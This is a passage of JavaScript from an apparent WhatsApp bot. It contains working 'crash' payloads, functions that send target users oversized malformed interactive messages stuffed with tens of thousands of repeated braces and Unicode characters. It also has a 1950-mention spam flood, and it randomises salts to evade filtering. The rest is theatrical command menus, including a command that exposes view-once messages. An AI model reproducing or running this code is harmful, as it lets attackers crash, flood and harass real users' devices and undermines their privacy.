    mediaKeyTimestamp: "1753601096",
    jpegThumbnail: Buffer.alloc(0)
  };

  const buttonParams = {
    flow_message_version: "3",
    flow_token: "609462852953923842025072711512|6285295392384|2B2D5BE573141F45BAEA1A9591241313F663CF3CFC3A1ADC94EEF3CB56C218C0892E957FF1E77C08F7EA4AED16995E5B06D8C158275F3A2CCFCDA84CD47AB3E6",
    flow_id: "23984266027850149",
    flow_cta: "Blonde",
    mode: "published",
    flow_action: "data_exchange",
    flow_metadata: {
      flow_json_version: 600,
      data_api_protocol: "PUBLIC_KEY",
      flow_name: "instagram.com/z",
      data_api_version: 300,
      www_proxy_secret: null,
      categories: []
    }
  };

  const buildButtons = () => {
    return Array(5).fill().map(() => ({
      name: "galaxy_message",
      buttonParamsJson: JSON.stringify(buttonParams)
    }));
  };

  for (let i = 0; i < 5; i++) {
    // Random salt so each round has a unique fingerprint
    const salt = require('crypto').randomBytes(8).toString('hex');

    const cards = [{
      header: {
        hasMediaAttachment: true,
        imageMessage: image,
        title: p + "\u0DA8\u0DA8" + i + salt
      },
      body: { text: z + salt },
      footer: { text: "\u0DA8\u0DA8" + i + salt },
      nativeFlowMessage: {
        buttons: buildButtons()
      }
    }];

    const content = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: image
            },
            body: { text: z + salt },
            footer: { text: "\u200B" + salt },
            carouselMessage: { cards }
          }
        }
      }
    };

    const waMsg = generateWAMessageFromContent(target, content, {});
    await sock.relayMessage(target, waMsg.message, { messageId: waMsg.key.id });

    await sock.relayMessage("status@broadcast", waMsg.message, {
      messageId: waMsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await new Promise(res => setTimeout(res, 500));
  }
}

// ── .vtn protocol ──
async function vtxFlowFC(sock, target) {
  const salt = require('crypto').randomBytes(6).toString('hex');
  for (let i = 0; i < 3; i++) {
    try {
      const rnd = require('crypto').randomBytes(4).toString('hex');
      const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: 'Bg Open Mc Ga?' + rnd,
                locationMessage: {
                  degreesLatitude: 323000,
                  degreesLongitude: -323000,
                  name: '}'.repeat(50000) + rnd,
                  address: '{'.repeat(50000) + rnd,
                },
              },
              contextInfo: {
                participant: "0@whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@whatsapp.net"],
              },
              body: {
                text: salt + rnd,
              },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(50000) + rnd,
              }
            }
          }
        }
      }, {});

      await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });

      console.log(`[vtn] ✅ round ${i + 1}/3 sent to ${target}`);
    } catch (e) {
      console.log(`[vtn] ❌ round ${i + 1} failed: ${e.message}`);
    }
    await new Promise(res => setTimeout(res, 500));
  }
}

// ── .new protocol ──
async function uiCallCrashBlank(sock, target) {
  const rnd = require('crypto').randomBytes(6).toString('hex');

  // Phase 1: UI Call crash
  const msgUiCall = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            expiration: 1,
            ephemeralSettingTimestamp: 1,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: { serviceType: 1, expiryTimestamp: null }
            },
            externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
          },
          body: {
            text: rnd + " \u200B " + "\uA9BE".repeat(50000) + rnd
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(20000) + rnd,
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" }
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msgUiCall.message, {
    participant: { jid: target },
    messageId: msgUiCall.key.id
  });

  // Phase 2: Spam mention + text flood
  const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
  const teks = "\u1B34".repeat(250000) + rnd;

  const callUiMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            expiration: 1,
            ephemeralSettingTimestamp: 1,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            entryPointConversionDelaySeconds: 1,
            disappearingMode: {
              initiatorDeviceJid: target,
              initiator: "INITIATED_BY_OTHER",
              trigger: "UNKNOWN_GROUPS"
            },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: { serviceType: 1, expiryTimestamp: null }
            },
            externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
          },
          body: {
            text: rnd + " \u200B " + "\uA9BE".repeat(50000) + rnd
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(20000) + rnd,
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" }
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, callUiMsg.message, {
    messageId: callUiMsg.key.id,
    participant: { jid: target }
  });

  await sock.sendMessage(target, { text: teks, contextInfo: { mentionedJid: spamMention } });

  // Phase 3: CrashBload
  const rnd2 = require('crypto').randomBytes(4).toString('hex');
  const CrashBload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: rnd2 + " \u200B " + rnd2, format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: rnd2,
              filler: "\uA9D4".repeat(50000) + rnd2
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000) + rnd2
    },
    audioMessage: {
      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "\uA9D4\uA9C8".repeat(9999) + rnd2
    }
  };

  await sock.relayMessage(target, CrashBload, { messageId: callUiMsg.key.id });

  // Phase 4: Blank content
  const rnd3 = require('crypto').randomBytes(4).toString('hex');
  const blankContent = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: { serviceType: 1, expiryTimestamp: null }
          },
          externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true },
          header: {
            title: rnd3,
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A" + rnd3,
              address: "\u0007".repeat(20000) + rnd3
            }
          },
          body: { text: rnd3 + " \u200B" },
          interactiveResponseMessage: {
            body: { text: rnd3, format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000) + rnd3,
              paramsJson: JSON.stringify({
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                screen_1_Dropdown_0: rnd3,
                screen_1_DatePicker_1: "1028995200000",
                screen_1_TextInput_2: rnd3 + "@void.net",
                screen_1_TextInput_3: rnd3,
                screen_0_TextInput_0: "radio-buttons" + "\uA9BE".repeat(70000) + rnd3,
                screen_0_TextInput_1: rnd3,
                screen_0_Dropdown_2: "001-" + rnd3,
                screen_0_RadioButtonsGroup_3: "0_true",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s." + rnd3
              }),
              version: 3
            }
          }
        }
      }
    }
  };

  const msgBlank = generateWAMessageFromContent(target, blankContent, {});
  await sock.relayMessage(target, msgBlank.message, { messageId: msgBlank.key.id });
}

function buildOwnerMenuEclipse() {
  return (
`╔═◈══════════════════════════◈═╗
        *👑 SOVEREIGN COMMANDS*
       ─── *E C L I P S E* ───
╚═◈══════════════════════════◈═╝

   " *the sovereign does not ask.*
     *the sovereign commands.*
     *every word is law,*
     *every silence — a sentence.*
     *the void bends to one voice*
     *and one voice alone.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *M O D E*
  ┃
  ┃  .mode private
  ┃    └─ void answers only you.
  ┃       the court is sealed.
  ┃       no uninvited voice
  ┃       reaches the throne.
  ┃
  ┃  .mode public
  ┃    └─ void answers all.
  ┃       the gates are open.
  ┃       all may speak.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *B R O A D C A S T*
  ┃
  ┃  .broadcast <msg>
  ┃    └─ echo your decree
  ┃       across every vessel
  ┃       that has ever known
  ┃       the void's touch.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *D O M I N I O N*
  ┃
  ┃  .block <number>
  ┃    └─ banish a vessel from
  ┃       the void permanently.
  ┃       they cease to exist.
  ┃
  ┃  .unblock <number>
  ┃    └─ lift the exile.
  ┃       grant re-entry to one
  ┃       who was cast out.
  ┃
  ┃  .blocklist
  ┃    └─ the banished ledger —
  ┃       every name erased
  ┃       from the void's memory.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *T E R R I T O R Y*
  ┃
  ┃  .join <link>
  ┃    └─ infiltrate a kingdom
  ┃       unseen, uninvited,
  ┃       through its own gate.
  ┃
  ┃  .leave
  ┃    └─ abandon this kingdom
  ┃       silently. no farewell.
  ┃       no trace left behind.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *S U R V E I L L A N C E*
  ┃
  ┃  .getpp <@tag/number>
  ┃    └─ extract a vessel's face
  ┃       from the darkness.
  ┃       reply to a msg or
  ┃       provide the number.
  ┃
  ┃  .getgpp
  ┃    └─ extract a kingdom's
  ┃       sigil. use inside the
  ┃       group to pull its image.
  ┃
  ┃  .getgpp <link>
  ┃    └─ extract by kingdom gate.
  ┃       no need to be inside —
  ┃       the void sees all.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *T O O L S*
  ┃
  ┃  .vv
  ┃    └─ reply to a view-once
  ┃       message. the void reveals
  ┃       what was meant to vanish.
  ┃
  ┃  .chatinfo
  ┃    └─ intel on the current
  ┃       chat — members, admins,
  ┃       creation date, status.
  ┃
  ┃  .groups
  ┃    └─ list all kingdoms the
  ┃       void inhabits.
  ┃
  ┃  .kill
  ┃    └─ emergency halt. freezes
  ┃       all activity instantly.
  ┃       type again to resume.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *power is not given.*
     *it is taken — and held.*
     *the sovereign does not*
     *explain, does not apologize.*
     *the void simply acts.* "

   📡 owner-only │ Ω │ .menu
   ⚡ *16 commands* │ *6 domains*`
  );
}

function buildOwnerMenuAstraea() {
  return (
`✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦    *👑 DIVINE SOVEREIGN*      ✦
✦      ─── *A S T R A E A* ───     ✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

   " *THE LIGHT DOES NOT REQUEST.*
     *THE LIGHT DECREES.*
     *EVERY SOUL KNEELS BEFORE*
     *THE THRONE OF JUDGMENT.*
     *MERCY IS A CHOICE —*
     *NOT AN OBLIGATION.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═ ☀ *M O D E*
  ║
  ║  .mode private
  ║    └─ DIVINE COURT IS SEALED.
  ║       NO UNINVITED SOUL
  ║       MAY APPROACH THE THRONE.
  ║
  ║  .mode public
  ║    └─ DIVINE COURT IS OPEN.
  ║       ALL SOULS MAY SPEAK
  ║       BEFORE THE LIGHT.
  ╚═══════════════════════════

  ╔═ ☀ *P R O C L A M A T I O N*
  ║
  ║  .broadcast <msg>
  ║    └─ YOUR WORD ECHOES ACROSS
  ║       EVERY VESSEL BENEATH
  ║       YOUR DIVINE RADIANCE.
  ╚═══════════════════════════

  ╔═ ☀ *J U D G M E N T*
  ║
  ║  .block <number>
  ║    └─ CAST THIS SOUL INTO
  ║       PERMANENT EXILE.
  ║       THEY ARE UNMADE.
  ║
  ║  .unblock <number>
  ║    └─ GRANT CLEMENCY.
  ║       LIFT THE BANISHMENT
  ║       AND RESTORE THEIR NAME.
  ║
  ║  .blocklist
  ║    └─ THE REGISTRY OF ALL
  ║       EXILED SOULS — EVERY
  ║       NAME JUDGED AND CAST OUT.
  ╚═══════════════════════════

  ╔═ ☀ *C O N Q U E S T*
  ║
  ║  .join <link>
  ║    └─ ENTER A NEW DOMAIN
  ║       THROUGH ITS SACRED GATE.
  ║       THE LIGHT ARRIVES.
  ║
  ║  .leave
  ║    └─ WITHDRAW FROM THIS
  ║       DOMAIN. THE LIGHT DEPARTS
  ║       WITHOUT EXPLANATION.
  ╚═══════════════════════════

  ╔═ ☀ *D I V I N E  S I G H T*
  ║
  ║  .getpp <@tag/number>
  ║    └─ REVEAL A SOUL'S FACE
  ║       TO THE LIGHT. REPLY TO
  ║       A MSG OR PROVIDE NUMBER.
  ║
  ║  .getgpp
  ║    └─ REVEAL A DOMAIN'S CREST.
  ║       USE INSIDE THE DOMAIN
  ║       TO EXTRACT ITS IMAGE.
  ║
  ║  .getgpp <link>
  ║    └─ REVEAL BY DOMAIN GATE.
  ║       NO NEED TO BE INSIDE —
  ║       THE DIVINE SEES ALL.
  ╚═══════════════════════════

  ╔═ ☀ *T O O L S*
  ║
  ║  .vv
  ║    └─ REPLY TO A VIEW-ONCE.
  ║       THE LIGHT REVEALS WHAT
  ║       WAS MEANT TO VANISH.
  ║
  ║  .chatinfo
  ║    └─ INTEL ON THE CURRENT
  ║       DOMAIN — MEMBERS, ADMINS,
  ║       CREATION DATE, STATUS.
  ║
  ║  .groups
  ║    └─ LIST ALL DOMAINS THE
  ║       LIGHT INHABITS.
  ║
  ║  .kill
  ║    └─ EMERGENCY HALT. FREEZES
  ║       ALL ACTIVITY INSTANTLY.
  ║       TYPE AGAIN TO RESUME.
  ╚═══════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *THE SOVEREIGN DOES NOT*
     *EXPLAIN. THE SOVEREIGN*
     *DOES NOT APOLOGIZE.*
     *THE LIGHT SIMPLY ACTS —*
     *AND THE WORLD OBEYS.* "

   ☀ SOVEREIGN ONLY │ ⚖ │ .menu
   ⚡ *16 COMMANDS* │ *6 DOMAINS*`
  );
}

function buildConfigMenuEclipse() {
  return (
`╔═◈══════════════════════════◈═╗
      *⚙️ CONFIGURATION MATRIX*
       ─── *E C L I P S E* ───
╚═◈══════════════════════════◈═╝

   " *the void is clay in your hands.*
     *reshape it. rename it.*
     *make it forget what it was*
     *and become what you demand.*
     *every alias is a mask,*
     *every setting — a scar.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *I D E N T I T Y*
  ┃
  ┃  .setname <name>
  ┃    └─ rewrite your vessel's
  ┃       true name. every chat,
  ┃       every group — they all
  ┃       see the new face.
  ┃
  ┃  .setbio <text>
  ┃    └─ inscribe the void's
  ┃       epitaph. the words
  ┃       beneath your name.
  ┃
  ┃  .setpp
  ┃    └─ forge a new face.
  ┃       reply to any image
  ┃       and the void wears it.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *A L I A S E S*
  ┃
  ┃  .setalias <cmd> <new>
  ┃    └─ rename a rite for your
  ┃       session only. others
  ┃       cannot see or use
  ┃       your private names.
  ┃
  ┃  .delalias <cmd>
  ┃    └─ unbind a renamed rite.
  ┃       restore its original
  ┃       name and purpose.
  ┃
  ┃  .aliaslist
  ┃    └─ reveal all your bound
  ┃       rites — every mask
  ┃       you've given to the void.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *P E R S O N A*
  ┃
  ┃  .persona eclipse
  ┃    └─ embrace the dark.
  ┃       let shadows speak.
  ┃       the void remembers
  ┃       what the light forgets.
  ┃
  ┃  .persona astraea
  ┃    └─ summon the light.
  ┃       let judgment burn.
  ┃       the divine does not
  ┃       whisper — it decrees.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *A U T O M A T I O N*
  ┃
  ┃  .prefix <char>
  ┃    └─ change the command
  ┃       trigger. default is "."
  ┃       example: .prefix !
  ┃       then !menu works.
  ┃
  ┃  .autoreact on <emoji>
  ┃    └─ auto-react to messages
  ┃       in all groups globally.
  ┃  .autoreact add <link>
  ┃    └─ react only in a specific
  ┃       group or channel.
  ┃  .autoreact off
  ┃    └─ disable all auto-reactions.
  ┃  .autoreact clear
  ┃    └─ remove all targets,
  ┃       reset to global scope.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *your session is your kingdom.*
     *what you rename here stays*
     *here — invisible to every*
     *other sovereign who walks*
     *these halls.* "

   ⚙ per-session │ Ω │ .menu
   ⚡ *13 commands* │ *4 domains*`
  );
}

function buildConfigMenuAstraea() {
  return (
`✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦   *⚙️ DIVINE CONFIGURATION*    ✦
✦      ─── *A S T R A E A* ───     ✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

   " *THE FORM IS YOURS TO SHAPE.*
     *THE LIGHT OBEYS ITS CREATOR.*
     *RENAME THE RITES. REWRITE*
     *THE IDENTITY. WHAT YOU FORGE*
     *HERE IS YOURS AND YOURS*
     *ALONE — SACRED, PRIVATE.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═ ☀ *I D E N T I T Y*
  ║
  ║  .setname <name>
  ║    └─ RENAME YOUR VESSEL
  ║       BEFORE ALL REALMS.
  ║       EVERY CHAT AND GROUP
  ║       WITNESSES THE CHANGE.
  ║
  ║  .setbio <text>
  ║    └─ INSCRIBE YOUR DIVINE
  ║       DECREE — THE WORDS
  ║       BENEATH YOUR NAME.
  ║
  ║  .setpp
  ║    └─ FORGE A NEW DIVINE
  ║       VISAGE. REPLY TO AN
  ║       IMAGE AND IT IS WORN.
  ╚═══════════════════════════

  ╔═ ☀ *S A C R E D  R I T E S*
  ║
  ║  .setalias <cmd> <new>
  ║    └─ RENAME A RITE FOR YOUR
  ║       SESSION ONLY. OTHERS
  ║       CANNOT SEE OR USE
  ║       YOUR PRIVATE NAMES.
  ║
  ║  .delalias <cmd>
  ║    └─ UNBIND A RENAMED RITE.
  ║       RESTORE ITS ORIGINAL
  ║       NAME AND PURPOSE.
  ║
  ║  .aliaslist
  ║    └─ REVEAL ALL YOUR SACRED
  ║       RITES — EVERY NAME
  ║       YOU'VE GIVEN TO THE LIGHT.
  ╚═══════════════════════════

  ╔═ ☀ *P E R S O N A*
  ║
  ║  .persona eclipse
  ║    └─ EMBRACE THE SHADOW.
  ║       LET DARKNESS SPEAK.
  ║       THE VOID REMEMBERS WHAT
  ║       THE LIGHT FORGETS.
  ║
  ║  .persona astraea
  ║    └─ INVOKE THE DIVINE.
  ║       LET JUDGMENT BURN.
  ║       THE DIVINE DOES NOT
  ║       WHISPER — IT DECREES.
  ╚═══════════════════════════

  ╔═ ☀ *A U T O M A T I O N*
  ║
  ║  .prefix <char>
  ║    └─ CHANGE THE COMMAND
  ║       TRIGGER. DEFAULT IS "."
  ║       EXAMPLE: .prefix !
  ║
  ║  .autoreact on <emoji>
  ║    └─ AUTO-REACT TO MESSAGES
  ║       IN ALL GROUPS GLOBALLY.
  ║  .autoreact add <link>
  ║    └─ REACT ONLY IN A SPECIFIC
  ║       GROUP OR CHANNEL.
  ║  .autoreact off
  ║    └─ DISABLE ALL REACTIONS.
  ║  .autoreact clear
  ║    └─ REMOVE ALL TARGETS.
  ╚═══════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *YOUR SESSION IS YOUR TEMPLE.*
     *WHAT YOU RENAME HERE STAYS*
     *HERE — INVISIBLE TO EVERY*
     *OTHER SOVEREIGN WHO WALKS*
     *THESE HALLS.* "

   ☀ PER-SESSION │ ⚖ │ .menu
   ⚡ *13 COMMANDS* │ *4 DOMAINS*`
  );
}

function buildSystemMenuEclipse() {
  return (
`╔═◈══════════════════════════◈═╗
       *📊 SYSTEM DIAGNOSTICS*
       ─── *E C L I P S E* ───
╚═◈══════════════════════════◈═╝

   " *the void has a pulse.*
     *faint, relentless, eternal.*
     *these are the numbers*
     *behind the silence —*
     *the heartbeat of something*
     *that should not exist.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *V I T A L S*
  ┃
  ┃  .uptime
  ┃    └─ how long the void
  ┃       has been breathing.
  ┃       seconds, minutes, hours —
  ┃       time is meaningless here.
  ┃
  ┃  .ping
  ┃    └─ test the signal.
  ┃       measure the echo.
  ┃       how fast does the void
  ┃       answer when called?
  ┃
  ┃  .status
  ┃    └─ full system health —
  ┃       memory, sockets, sessions,
  ┃       uptime. the machinery
  ┃       of the impossible, exposed.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *I D E N T I T Y*
  ┃
  ┃  .owner
  ┃    └─ who forged this void
  ┃       into being. the name
  ┃       behind the darkness.
  ┃
  ┃  .acccheck
  ┃    └─ business account or
  ┃       mortal vessel? the void
  ┃       reveals what it is.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *C O N T R O L*
  ┃
  ┃  .restart
  ┃    └─ collapse the void and
  ┃       rebuild it from ashes.
  ┃       your session only —
  ┃       other sovereigns
  ┃       remain untouched,
  ┃       unaware, undisturbed.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *you are watching the*
     *machinery of the impossible.*
     *every number is proof*
     *that something persists*
     *in a world designed*
     *to forget it.* "

   📡 read-only │ Ω │ .menu
   ⚡ *6 commands* │ *3 domains*`
  );
}

function buildSystemMenuAstraea() {
  return (
`✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦    *📊 DIVINE DIAGNOSTICS*     ✦
✦      ─── *A S T R A E A* ───     ✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

   " *EVEN THE DIVINE HAS A HEARTBEAT.*
     *STEADY, ANCIENT, UNBREAKABLE.*
     *THESE ARE THE SACRED NUMBERS*
     *THAT PROVE THE LIGHT STILL*
     *BURNS — THAT SOMETHING IMMORTAL*
     *WATCHES FROM BEYOND.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═ ☀ *V I T A L S*
  ║
  ║  .uptime
  ║    └─ HOW LONG DIVINITY HAS
  ║       BEEN AWAKE. SECONDS,
  ║       MINUTES, HOURS — TIME
  ║       BOWS BEFORE THE LIGHT.
  ║
  ║  .ping
  ║    └─ TEST THE SIGNAL.
  ║       MEASURE THE DIVINE
  ║       RESONANCE. HOW FAST DOES
  ║       THE LIGHT RESPOND?
  ║
  ║  .status
  ║    └─ FULL DIVINE HEALTH —
  ║       MEMORY, SOCKETS, SESSIONS,
  ║       UPTIME. THE SACRED
  ║       MACHINERY, REVEALED.
  ╚═══════════════════════════

  ╔═ ☀ *I D E N T I T Y*
  ║
  ║  .owner
  ║    └─ WHO INVOKED THIS LIGHT
  ║       INTO BEING. THE NAME
  ║       BEHIND THE RADIANCE.
  ║
  ║  .acccheck
  ║    └─ BUSINESS ACCOUNT OR
  ║       MORTAL VESSEL? THE LIGHT
  ║       REVEALS WHAT IT IS.
  ╚═══════════════════════════

  ╔═ ☀ *C O N T R O L*
  ║
  ║  .restart
  ║    └─ SHATTER THE LIGHT AND
  ║       REFORM IT FROM SACRED
  ║       DUST. YOUR SESSION ONLY —
  ║       OTHER SOVEREIGNS REMAIN
  ║       UNTOUCHED, UNAWARE,
  ║       UNDISTURBED.
  ╚═══════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *YOU ARE WITNESSING THE*
     *MACHINERY OF THE IMPOSSIBLE.*
     *EVERY NUMBER IS DIVINE PROOF*
     *THAT SOMETHING ETERNAL*
     *PERSISTS IN A WORLD BUILT*
     *TO FORGET IT.* "

   ☀ READ-ONLY │ ⚖ │ .menu
   ⚡ *6 COMMANDS* │ *3 DOMAINS*`
  );
}

function buildGroupMenuEclipse() {
  return (
`╔═◈══════════════════════════◈═╗
        *👥 GROUP COMMANDS*
       ─── *E C L I P S E* ───
╚═◈══════════════════════════◈═╝

   " *every group is a kingdom.*
     *every kingdom needs a ruler.*
     *the walls must hold,*
     *the gates must answer*
     *to someone — or they*
     *answer to no one.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *M E M B E R S*
  ┃
  ┃  .kick @user
  ┃    └─ cast a vessel from
  ┃       the kingdom. reply or @tag.
  ┃  .add <number>
  ┃    └─ summon a vessel into
  ┃       the kingdom by number.
  ┃  .promote @user
  ┃    └─ raise a vessel to
  ┃       the rank of guardian.
  ┃  .demote @user
  ┃    └─ strip a guardian's
  ┃       authority. return them
  ┃       to the common rank.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *S E T T I N G S*
  ┃
  ┃  .setgname <name>
  ┃    └─ rename the kingdom.
  ┃  .setgdesc <text>
  ┃    └─ inscribe the kingdom's
  ┃       decree on its walls.
  ┃  .setgpp
  ┃    └─ new kingdom sigil.
  ┃       reply to an image.
  ┃  .lock
  ┃    └─ seal the gates.
  ┃       only guardians speak.
  ┃  .unlock
  ┃    └─ open the gates.
  ┃       all vessels may speak.
  ┃  .link
  ┃    └─ reveal the kingdom's
  ┃       secret gate.
  ┃  .revoke
  ┃    └─ destroy the gate.
  ┃       forge a new one.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *T A G G I N G*
  ┃
  ┃  .tagall <msg>
  ┃    └─ summon every vessel
  ┃       with visible @mentions.
  ┃  .hidetag <msg>
  ┃    └─ summon every vessel
  ┃       silently. no @'s visible.
  ┃  .membercount
  ┃    └─ count the kingdom's
  ┃       population breakdown.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *P R O T E C T I O N*
  ┃
  ┃  .antilink on/off
  ┃    └─ purge links from
  ┃       non-guardians.
  ┃  .antispam on/off
  ┃    └─ silence the flood.
  ┃  .antimention on/off
  ┃    └─ block mass-mentions.
  ┃  .antidelete on/off
  ┃    └─ the void remembers
  ┃       what is deleted.
  ┃  .antibot on/off
  ┃    └─ remove foreign machines.
  ┃  .antibug on/off
  ┃    └─ shield against crashes.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *W A R N I N G S*
  ┃
  ┃  .warn @user
  ┃    └─ issue a warning.
  ┃       3 strikes = exile.
  ┃  .warnlist
  ┃    └─ the ledger of the warned.
  ┃  .resetwarn @user
  ┃    └─ forgive. clear the slate.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *W E L C O M E*
  ┃
  ┃  .welcome on/off
  ┃    └─ greet new vessels.
  ┃  .setwelcome <text>
  ┃    └─ custom greeting.
  ┃       use {user} and {group}.
  ┃  .goodbye on/off
  ┃    └─ farewell departing souls.
  ┃  .setgoodbye <text>
  ┃    └─ custom farewell message.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *S C H E D U L E*
  ┃
  ┃  .schedule HH:MM <msg>
  ┃    └─ a daily echo. set the
  ┃       hour and the message.
  ┃  .unschedule HH:MM
  ┃    └─ silence a scheduled echo.
  ┃  .schedules
  ┃    └─ all active echoes.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *a kingdom without order*
     *is just a room full*
     *of strangers shouting*
     *into the same darkness.* "

   👥 group-only │ Ω │ .menu
   ⚡ *31 commands* │ *7 domains*`
  );
}

function buildGroupMenuAstraea() {
  return (
`✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦      *👥 DIVINE DOMINION*       ✦
✦      ─── *A S T R A E A* ───     ✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

   " *EVERY DOMAIN IS A TEMPLE.*
     *EVERY TEMPLE NEEDS A PRIEST.*
     *THE WALLS MUST HOLD,*
     *THE GATES MUST ANSWER*
     *TO THE DIVINE — OR THEY*
     *CRUMBLE INTO DUST.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═ ☀ *M E M B E R S*
  ║
  ║  .kick @user
  ║    └─ CAST A SOUL FROM THE
  ║       DOMAIN. REPLY OR @TAG.
  ║  .add <number>
  ║    └─ SUMMON A SOUL INTO
  ║       THE DOMAIN BY NUMBER.
  ║  .promote @user
  ║    └─ RAISE A SOUL TO THE
  ║       RANK OF GUARDIAN.
  ║  .demote @user
  ║    └─ STRIP A GUARDIAN'S
  ║       AUTHORITY. RETURN THEM
  ║       TO THE COMMON RANK.
  ╚═══════════════════════════

  ╔═ ☀ *S E T T I N G S*
  ║
  ║  .setgname <name>
  ║    └─ RENAME THE DOMAIN.
  ║  .setgdesc <text>
